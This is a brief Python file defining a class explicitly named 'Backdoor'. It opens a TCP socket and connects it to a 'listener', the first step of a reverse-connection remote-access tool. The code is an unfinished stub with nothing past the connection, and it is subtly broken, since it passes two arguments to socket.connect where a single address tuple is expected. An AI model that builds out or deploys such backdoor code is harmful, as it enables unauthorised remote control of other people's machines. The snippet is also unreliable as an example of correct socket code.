import socket


class Backdoor:
    def __init__(self, client, listener):

        connection = socket.socket(
            socket.AF_INET,     # IPv4
            socket.SOCK_STREAM, # TCP socket
        )
             
        connection.connect(client, listener)


